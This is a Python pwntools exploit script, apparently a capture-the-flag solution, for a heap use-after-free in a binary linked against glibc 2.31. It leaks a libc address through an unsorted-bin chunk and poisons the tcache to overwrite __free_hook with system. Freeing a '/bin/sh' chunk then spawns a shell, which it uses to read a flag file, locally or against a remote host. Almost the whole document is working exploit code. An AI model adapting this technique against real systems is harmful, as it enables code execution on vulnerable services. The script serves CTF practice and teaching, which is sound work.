#!/usr/bin/env python3
import os
import sys
import subprocess
from pwn import *

exe = ELF("main_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.31.so")
context.binary = exe

URL = ''
PORT = 0

def start(argv=[], *a, **kw):
    # template fatto da greyhat00 per chi viene dopo.
    # usalo liberamente per imparare e sperimentare.
    # buona fortuna, lettore. Happy pwn!
    if args.R2:
        io = process([exe.path] + argv, *a, **kw)
        # changeme sys.main
        # parametri di r2 personalizzabili
        # es:
        # r2_cmd = "r2 -c 'db sym.foo+122; dc; Vpp; px @ section..got' -d " + str(io.pid)
        r2_cmd = "r2 -c 'db sym.main; dc; Vpp' -d " + str(io.pid)
        
        subprocess.Popen(
            [
            "x-terminal-emulator",                  # open systen default terminal emulator
             "-e", 
             os.environ.get("SHELL", "/bin/sh"),    # execute default shell
             "-c", 
             r2_cmd],                               # with radare2 command
            stdout=subprocess.DEVNULL,
            stderr=subprocess.STDOUT
        )
        # pause the current python script until key pressed
        # manually added to avoid race condition waiting for r2 to start     
        ui.pause()
        return io

    if args.REMOTE:
        try:
            host = sys.argv[1]
            port_val = int(sys.argv[2])
        except (IndexError, ValueError):
            host = URL
            port_val = PORT

        if not host or not port_val:
            log.error(
                "REMOTE mode selected but HOST or PORT is missing or invalid.\n"
                "Usage example:\n"
                "  ./exploit.py REMOTE 8.8.8.8 9999\n"
                "Or set URL and PORT variables in the script."
            )
            exit(1)

        log.info("Connecting to remote"+ str(host) + str(port_val))
        return remote(host, port_val)

    else:
        log.info("Launching local process")
        return process([exe.path] + argv, *a, **kw)


io = start()
line = b">"
def malloc(size):
    io.sendlineafter(line, b'1')
    io.sendlineafter(b': ', str(size).encode())

def free(idx):
    io.sendlineafter(line, b'4')
    io.sendlineafter(b': ', str(idx).encode())

def leak_address(idx):
    io.sendlineafter(line, b'3')
    io.sendlineafter(b': ', str(idx).encode())
    return u64(io.recvline()[:-1].ljust(8, b'\x00'))

def edit(idx, data):
    io.sendlineafter(line, b'2')
    io.sendlineafter(b': ', str(idx).encode())
    io.sendlineafter(b': ', data)


'''
The vuln is an UAF in libc 2.31, so no heap
protection and __free_hook vulnerable.
'''
unsorted_bin_chunk = 0
size = 0x430

'''
To start, must be allocated two chunks with size >= 0x420
and free one of them. With this the chunk will point to
an area in the libc causing a leak.
'''
malloc(size)
malloc(size)
free(unsorted_bin_chunk)
libc_leak = leak_address(unsorted_bin_chunk)
puts_addr = libc_leak - 1476544             # then i allign the libc leak
libc.address = puts_addr - libc.sym['puts']

success(f"libc leak @ {hex(libc_leak)}")
success(f"puts leak @ {hex(puts_addr)}")

'''
Now i have all we need.
As second step, with the UAF i change the pointer of the
freed chunk to make sure that in the next allocation
will be allocated where i want.
'''
small_size = 0x70
malloc(small_size) 
malloc(small_size) 
malloc(small_size) 

pivot = 4 
free(pivot-1)
free(pivot)
# tcache -> pivot -> pivot-1 -> null

# here i leak the heap address just for debugging
heap_leak = leak_address(pivot)
success(f"heap @ {hex(heap_leak)}")



edit(pivot, p64(libc.sym['__free_hook']))
# tcache -> pivot -> __free_hook


malloc(small_size) # allocated on the heap with idx 5
malloc(small_size) # all. in __free_hook zone with idx 6

bin_sh = 5
free_hook = 6
edit(bin_sh, b"/bin/sh\x00")
edit(free_hook, p64(libc.sym['system']))
free(bin_sh) # triggers system(binsh)

io.sendline(b"cat flag.txt")
data = io.recvregex(rb'KSUS\{.*\}', capture=True)
flag = data.group(0).decode()
success('Flag: ' + flag)
write('flag.txt', flag)
io.close()
